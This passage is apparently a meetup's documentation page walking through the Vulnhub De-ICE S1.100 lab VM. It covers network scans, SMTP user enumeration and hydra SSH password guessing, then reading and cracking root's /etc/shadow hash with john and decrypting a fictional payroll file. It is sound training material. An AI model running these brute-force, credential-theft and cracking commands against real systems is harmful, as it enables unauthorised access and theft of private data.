@@ -1,0 +1,311 @@
+.. include:: /pentest_links.txt
+
+.. _De-ICE1:
+
+**************
+De-ICE Level 1
+**************
+
+Setup
+=====
+
+This is to document the meetup's efforts responding to the challenge `Vulnhub De-ICE: S1.100 <https://www.vulnhub.com/entry/de-ice-s1100,8/>`_, the first of the Vulnhub De-ICE series. This is a challenge to get the CEO's bank account information.
+
+Setting up the VM
+-----------------
+
+The VM comes packaged as the live ISO `De-ICE_S1.100.iso <https://www.vulnhub.com/entry/de-ice-s1100,8/#download>`_ running SLAX 5.1.7 (based on Slackware 10.2.0). It uses the fixed IP 192.168.1.100; to force it to use DHCP on your local network, change the 192.168.1.100 network card to be a local network on your VM server (no network access) and add another ethernet interface that will pick up a DHCP address.
+
+Setting up your environment
+---------------------------
+
+.. code-block:: bash
+
+  PT=$HOME/pentest/de-ice1
+  mkdir -p $PT
+  cd $PT
+  # download de-ice1_setup.sh
+  curl --silent --remote-name https://pentest-meetup.appspot.com/html/_downloads/de-ice1_setup.sh
+  # edit as needed; later the recon will give you TARGET IP
+  source de-ice1_setup.sh
+
+The source for :file:`de-ice1_setup.sh` (:download:`de-ice1_setup.sh`) should look something like the following.
+
+.. literalinclude:: de-ice1_setup.sh
+   :language: bash
+
+Reconnaisance
+=============
+
+Network reconnaissance
+----------------------
+
+Start with some standard network reconnaissance looking for the vulnerable host:
+
+.. code-block:: bash
+
+  PT=$HOME/pentest/de-ice1
+  source $PT/de-ice1_setup.sh
+  cd $PT/nmap
+
+  $SUDO nmap -sn -PE -oA nmap_sn $SUBNET
+  $SUDO chown $USER.$USER nmap_sn.*
+  # use the grep-able output to get a list of target hosts
+  grep Up nmap_sn.gnmap | cut -d" " -f2 > $TARGETS
+  # use the xml output to get an html report
+  xsltproc nmap_sn.xml -o nmap_sn.html
+
+Here we know $TARGET and can fill it in $PT/de-ice1_setup.sh and also edit :file:`/etc/hosts` to add "de-ice1.com" (``echo "$TARGET de-ice1.com" | $SUDO tee -a /etc/hosts``).
+
+.. code-block:: bash
+
+  PT=$HOME/pentest/de-ice1
+  source $PT/de-ice1_setup.sh
+  cd $PT/nmap
+
+  $SUDO nmap -A -vv -T3 --max-retries 5 -Pn -oA nmap_A $TARGET
+  $SUDO chown $USER.$USER nmap_A.*
+  xsltproc nmap_A.xml -o nmap_A.html
+
+Running this reveals:
+
+.. code-block:: console
+  :emphasize-lines: 1-3,6,9,12-13
+
+  20/tcp  closed ftp-data
+  21/tcp  open   ftp      vsftpd (broken: could not bind listening IPv4 socket)
+  22/tcp  open   ssh      OpenSSH 4.3 (protocol 1.99)
+  |_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
+  |_sshv1: Server supports SSHv1
+  25/tcp  open   smtp     Sendmail 8.13.7/8.13.7
+  | smtp-commands: slax.example.net Hello [192.168.1.28], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, 8BITMIME, SIZE, DSN, ETRN, AUTH DIGEST-MD5 CRAM-MD5, DELIVERBY, HELP, 
+  |_ 2.0.0 This is sendmail version 8.13.7 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use "HELP <topic>". 2.0.0 To report bugs in the implementation see 2.0.0 http://www.sendmail.org/email-addresses.html 2.0.0 For local information send email to Postmaster at your site. 2.0.0 End of HELP info 
+  80/tcp  open   http     Apache httpd 2.0.55 ((Unix) PHP/5.1.2)
+  |_http-methods: No Allow or Public header in OPTIONS response (status code 200)
+  |_http-title: Site doesn't have a title (text/html).
+  110/tcp open   pop3     Openwall popa3d
+  143/tcp open   imap     UW imapd 2004.357
+  |_imap-capabilities: LOGIN-REFERRALS AUTH=LOGINA0001 completed IMAP4REV1 MAILBOX-REFERRALS THREAD=ORDEREDSUBJECT STARTTLS CAPABILITY NAMESPACE OK BINARY IDLE LITERAL+ MULTIAPPEND UNSELECT THREAD=REFERENCES SORT SASL-IR SCAN
+  443/tcp closed https
+  MAC Address: 08:00:27:2A:6A:09 (Cadmus Computer Systems)
+  Device type: general purpose
+  Running: Linux 2.6.X
+  OS CPE: cpe:/o:linux:linux_kernel:2.6
+  OS details: Linux 2.6.13 - 2.6.32
+
+Port 80 reconnaissance via dirb & nikto
+---------------------------------------
+
+.. code-block:: bash
+
+  PT=$HOME/pentest/de-ice1
+  source $PT/de-ice1_setup.sh
+  cd $PT/spider
+
+  nikto -output nikto.html -C all -host $HOST -port 80
+  dirb  http://$HOST/ -o dirb80.txt
+
+No immediate remote exploits were available, but some web pages were identified for further reconnaissance.
+
+http://de-ice1.com/info.php adds more software versions
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+Exploring http://de-ice1.com/info.php adds to our tally of software versions:   Linux slax 2.6.16 #95 Wed May 17 10:16:21 GMT 2006 i686; Apache/2.0.55 (Unix) with DOCUMENT_ROOT /var/www/htdocs and GATEWAY_INTERFACE CGI/1.1; PHP/5.1.2 with PHP API 20041225, PHP Extension 20050922; Zend Engine v2.1.0 with Zend Extension 220051025; OpenSSL 0.9.8a 11 Oct 2005; vsftpd; OpenSSH 4.3 (protocol 1.99); Sendmail 8.13.7/8.13.7; Openwall popa3d; and UW imapd 2004.357.
+
+At this point none of these appeared to offer an easy remote exploit.
+
+http://de-ice1.com/index2.php yields user id candidates
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+This web page offered up a list of email addresses which can be verified via :program:`smtp-user-enum`: marym@herot.net, patrickp@herot.net, thompsont@herot.net, benedictb@herot.net, genniege@herot.net, michaelp@herot.net, longe@herot.net, adamsa@herot.net, banterb@herot.net, and coffeec@herot.net. This can lead to user id guesses.
+
+:program:`smtp-user-enum` offers 3 three options for checking users: "-M VRFY", "-M EXPN", and "-M RCPT". You should run your user list plus an account you're nearly certain should exist, and an account that shouldn't exist. In this challenge, VRFY indicates all the accounts exist (they don't), EXPN says none do (some do), and RCPT actually indicates only 4 exist (which is the right answer when including root).
+
+.. code-block:: bash
+  :emphasize-lines: 4,10-14,16-18
+
+  PT=$HOME/pentest/de-ice1
+  source $PT/de-ice1_setup.sh
+  cd $PT/exploit
+  U="marie,mary pat,patrick terry,thompson ben,benedict erin,gennieg paul,michael ester,long adam,adams bob,banter chad,coffee"
+  for u in $U; do
+    FN=${u%,*}
+    LN=${u#*,}
+    FI=${FN:0:1}
+    LI=${LN:0:1}
+    echo $FN$LI
+    echo $FI$LN
+    echo $LN$FI
+    echo $LI$FN
+  done > users.txt
+  # Add root to list
+  echo "root" >> users.txt
+
+  smtp-user-enum -M VRFY -U users.txt -t de-ice1.com
+  # results in all user ids exist
+  smtp-user-enum -M EXPN -U users.txt -t de-ice1.com
+  # results in no user ids exist
+  smtp-user-enum -M RCPT -U users.txt -t de-ice1.com
+  # results in aadams, bbanter, ccoffee, root exist
+
+So we guess there are 4 user accounts from this list: aadams, bbanter, ccoffee, root.
+
+The Exploit
+===========
+
+Guessing passwords to get logged in
+-----------------------------------
+
+Our first attempt is to check our candidate user id's for exceptionally weak passwords (:program:`hydra`'s "-e nsr" option):
+
+.. code-block:: bash
+  :emphasize-lines: 4,11-12
+
+  PT=$HOME/pentest/de-ice1
+  source $PT/de-ice1_setup.sh
+  cd $PT/exploit
+  cat > users.txt <<EOF
+  aadams
+  bbanter
+  ccoffee
+  root
+  EOF
+
+  hydra -L users.txt -e nsr -t 2 de-ice1.com ssh
+  # results in
+  # [22][ssh] host: de-ice1.com   login: bbanter   password: bbanter
+
+So user bbanter/bbanter allows some reconnaissance:
+
+.. code-block:: bash
+  :emphasize-lines: 1-2,5,8,10,11,13
+
+  ssh bbanter@de-ice1.com    # password bbanter
+  cat /etc/passwd
+  # results show these user ids matching smtp-user-enum.
+  # root:x:0:0:DO NOT CHANGE PASSWORD - WILL BREAK FTP ENCRYPTION:/root:/bin/bash
+  # aadams:x:1000:10:,,,:/home/aadams:/bin/bash
+  # bbanter:x:1001:100:,,,:/home/bbanter:/bin/bash
+  # ccoffee:x:1002:100:,,,:/home/ccoffee:/bin/bash
+  grep 10 /etc/group
+  # results show aadams group 10 is the wheel group
+  # wheel::10:root
+  grep PermitRootLogin /etc/ssh/sshd_config
+  # results show no ssh as root
+  # PermitRootLogin no
+
+So user aadams is our target for SSH password cracking.
+
+Getting a user id with privileges
+---------------------------------
+
+We're focused on the senior system admin Adam Adams with user id aadams. We'll try online SSH password guessing with :program:`hydra`, starting with smaller password lists, graduating to larger ones as required. Our source of password lists can come from one of Kali's :file:`/usr/share/wordlists/` but instead we'll look at `SecLists <https://github.com/danielmiessler/SecLists/tree/master/Passwords>`_ and `Ultimate Password List <http://area51archives.com/index.php?title=Ultimate_Password_List>`_ and choose one of those. Of interest is the rockyou series, starting with shorter ones and graduating up until we met success with rockyou-75.txt (not the whole rockyou list but the largest sublist). Be wary of specifying too many parallel tasks: running this list with "-t 32" failed to find the password "nostradamus", but running with "-t 4" worked (after a much longer search). If that the rockyou list didn't work we'd try :file:`pw list 3.txt` from the Ultimate Password List because it's big enough without being too big.
+
+Here we obtain the password lists:
+
+.. code-block:: bash
+  :emphasize-lines: 5-
+
+  PT=$HOME/pentest/de-ice1
+  source $PT/de-ice1_setup.sh
+  cd $PT/exploit
+
+  git clone https://github.com/danielmiessler/SecLists.git
+  cp Passwords/rockyou-75.txt .
+  curl --silent --remote-name http://area51archives.com/files/pass_list.rar
+  unrar -e pass_list.rar
+  cp pass_list/pw\ list\ 3.txt .
+
+Here we use them to get aadams password (nostradamus):
+
+.. code-block:: bash
+  :emphasize-lines: 5-
+
+  PT=$HOME/pentest/de-ice1
+  source $PT/de-ice1_setup.sh
+  cd $PT/exploit
+
+  # The following failed because of "-t 32" even though password was in list.
+  # hydra -F -l aadams -P rockyou-75.txt -t 32  de-ice1.com ssh
+  # So tried reducing "-t 32" to "-t 4" with success and longer run time.
+  hydra -V -F -l aadams -P rockyou-75.txt -t 4  de-ice1.com ssh
+
+After ``ssh aadams@de-ice1.com``, ``sudo -l`` permissions reveal aadams can display root's entry in :file:`/etc/shadow`:
+
+.. code-block:: bash
+  :emphasize-lines: 1-2,6
+
+  sshpass -p 'nostradamus' ssh aadams@de-ice1.com
+  sudo -l
+  # results in
+  #  User aadams may run the following commands on this host:
+  #    (root) NOEXEC: /bin/ls
+  #    (root) NOEXEC: /usr/bin/cat
+  #    (root) NOEXEC: /usr/bin/more
+  #    (root) NOEXEC: !/usr/bin/su *root*
+
+So aadams can ``cat /etc/shadow``.
+
+Cracking root in :file:`/etc/shadow`
+------------------------------------
+
+On de-ice1.com run these commands as aadams:
+
+.. code-block:: bash
+
+  cat /etc/passwd | grep root | tee pass.txt
+  sudo cat /etc/shadow | grep root | tee shadow.txt
+
+Run the code below to create :file:`passwd.txt` and :file:`shadow.txt` with identical contents as de-ice1.com then :program:`/usr/sbin/unshadow` them:
+
+.. code-block:: bash
+  :emphasize-lines: 5-6,13-17
+
+  PT=$HOME/pentest/de-ice1
+  source $PT/de-ice1_setup.sh
+  cd $PT/exploit
+
+  SHADOW='root:$1$TOi0HE5n$j3obHaAlUdMbHQnJ4Y5Dq0:13553:0:::::'
+  PASSWD='root:x:0:0:DO NOT CHANGE PASSWORD - WILL BREAK FTP ENCRYPTION:/root:/bin/bash'
+
+  echo "$SHADOW" | tee shadow.txt
+  echo "$PASSWD" | tee passwd.txt
+  /usr/sbin/unshadow passwd.txt shadow.txt > unshadow.txt
+  # rockyou-75.txt doesn't find the password
+  /usr/sbin/john --rules --wordlist="rockyou-75.txt" unshadow.txt
+  # pw list 3.txt finds password
+  /usr/sbin/john --rules --wordlist="pw list 3.txt" unshadow.txt
+  /usr/sbin/john --show unshadow.txt
+  # results in
+  # root:tarot:0:0:DO NOT CHANGE PASSWORD - WILL BREAK FTP ENCRYPTION:/root:/bin/bash
+
+Now we have root access with password "tarot".
+
+Getting the CEO's bank account information
+------------------------------------------
+
+To obtain the CEO's bank account information: ``ssh aadams@de-ice1.com``, ``su - root``, then find and decrypt the CEO's bank account information:
+
+.. code-block:: bash
+  :emphasize-lines: 5-8
+
+  sshpass -p "nostradamus" ssh aadams@de-ice1.com
+  su - root    # password "tarot"
+  cd ~ftp/incoming
+  ls -l    # see salary_dec2003.csv.enc
+  # "openssl enc -d" decrypts
+  #   "openssl enc -h" lists possible ciphers, 1st is aes-128-cbc
+  #   use root password for decryption
+  openssl enc -aes-128-cbc -d -pass pass:tarot -in salary_dec2003.csv.enc -out salary_dec2003.csv
+  head salary_dec2003.csv
+
+This outputs the desired information:
+
+.. code-block:: console
+  :emphasize-lines: 2
+
+  ,Employee ID,Name,Salary,Tax Status,Federal Allowance (From W-4),State Tax (Percentage),Federal Income Tax (Percentage based on Federal Allowance),Social Security Tax (Percentage),Medicare Tax (Percentage),Total Taxes Withheld (Percentage),"Insurance Deduction (Dollars)","Other Regular Deduction(Dollars)","Total Regular Deductions (Excluding taxes, in dollars)","Direct Deposit Info Routing Number","Direct Deposit Info Account Number"
+  ,1,Charles E. Ophenia,"$225,000.00",1,4,2.30%,28.00%,6.30%,1.45%,38.05%,$360.00,$500.00,$860.00,183200299,1123245
+
+So the CEO's (routing number,account number) is (183200299,1123245) and we are done.
+
